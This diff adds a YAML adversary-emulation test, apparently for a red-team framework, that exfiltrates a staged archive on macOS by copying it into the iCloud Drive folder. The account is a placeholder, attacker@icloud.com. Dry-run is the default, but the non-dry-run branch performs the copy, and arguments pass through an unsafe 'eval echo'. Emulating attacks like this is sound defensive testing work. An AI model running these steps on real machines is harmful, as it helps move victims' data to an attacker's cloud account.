@@ -1,0 +1,130 @@
+id: 013-icloud-data-sync
+name: iCloud Data Sync
+description: Exfiltrates data using iCloud synchronization mechanisms
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: a3b4c5d6-e7f8-4091-a2b3-c4d5e6f7a8b9
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to sync to iCloud
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  icloud_folder:
+    description: Target iCloud folder
+    type: string
+    default: "~/Library/Mobile Documents"
+  apple_id:
+    description: Apple ID for iCloud
+    type: string
+    default: "attacker@icloud.com"
+  sync_timeout:
+    description: Sync timeout in seconds
+    type: string
+    default: "60"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Check iCloud availability
+    type: command
+    executor: bash
+    command: |
+      icloud_path=$(eval echo '{{ args.icloud_folder }}')
+      if [ -d "$icloud_path" ]; then
+        echo "iCloud folder available at: $icloud_path"
+        ls -la "$icloud_path" | head -5
+      else
+        echo "WARNING: iCloud folder not found"
+      fi
+    cleanup: false
+  
+  - name: Prepare file for sync
+    type: command
+    executor: bash
+    command: |
+      echo "iCloud Sync Configuration:"
+      echo "  Source: $(basename '{{ args.file_path }}')"
+      echo "  Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+      echo "  Target folder: {{ args.icloud_folder }}"
+      echo "  Apple ID: {{ args.apple_id }}"
+    cleanup: false
+  
+  - name: Copy file to iCloud
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: iCloud Sync"
+        echo "Would copy to iCloud:"
+        echo "  cp '{{ args.file_path }}' '{{ args.icloud_folder }}/'"
+        echo "After sync, file would be accessible across Apple devices"
+      else
+        icloud_path=$(eval echo '{{ args.icloud_folder }}')
+        if [ -d "$icloud_path" ]; then
+          cp '{{ args.file_path }}' "$icloud_path/$(basename '{{ args.file_path }}')"
+          echo "File copied to iCloud folder"
+          # Wait for sync
+          sleep {{ args.sync_timeout }}
+        else
+          echo "ERROR: iCloud folder not accessible"
+          exit 1
+        fi
+      fi
+    cleanup: false
+checks:
+  - name: File exists
+    description: Verify file for sync
+    type: command
+    command: test -f '{{ args.file_path }}'
+  
+  - name: iCloud accessible
+    description: Verify iCloud folder is accessible
+    type: command
+    command: |
+      icloud_path=$(eval echo '{{ args.icloud_folder }}')
+      test -d "$icloud_path" && echo "iCloud accessible"
+tests:
+  dry_run:
+    - name: Test iCloud sync (dry-run)
+      description: Test iCloud synchronization
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "iCloud test data" > /tmp/test_icloud.dat
+        
+        - name: Prepare for sync
+          type: command
+          executor: bash
+          command: |
+            echo "iCloud Sync Simulation:"
+            echo "Source: /tmp/test_icloud.dat"
+            echo "Would sync to: ~/Library/Mobile Documents"
+        
+        - name: Show sync status
+          type: command
+          executor: bash
+          command: |
+            echo "Sync Status:"
+            echo "  Device: macOS"
+            echo "  Account: attacker@icloud.com"
+            echo "  Files: 1"
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_icloud.dat
+    ignore_errors: true
